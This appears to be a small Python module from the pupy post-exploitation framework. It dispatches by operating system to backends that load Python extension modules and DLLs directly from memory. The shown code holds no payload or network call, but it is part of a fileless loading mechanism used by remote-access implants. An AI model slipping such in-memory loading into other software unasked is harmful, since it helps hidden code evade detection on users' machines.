# -*- coding: utf-8 -*-

__all__ = ('import_module', 'load_dll')

import sys

if sys.platform.startswith('linux'):
    from .linux import load_content
elif sys.platform == 'win32':
    from .win32 import load_content
else:
    from .posix import load_content

from pupy import get_logger


logger = get_logger('pymemimporter')


def import_module(data, initname, fullname, path):
    logger.debug('Import module %s', fullname)
    try:
        return load_content(data, fullname, False, initname)
    except Exception as e:
        logger.exception(e)
        raise


def load_dll(name, data):
    logger.debug('Load dll %s', name)
    try:
        return load_content(data, name, True)
    except Exception as e:
        logger.exception(e)
        raise
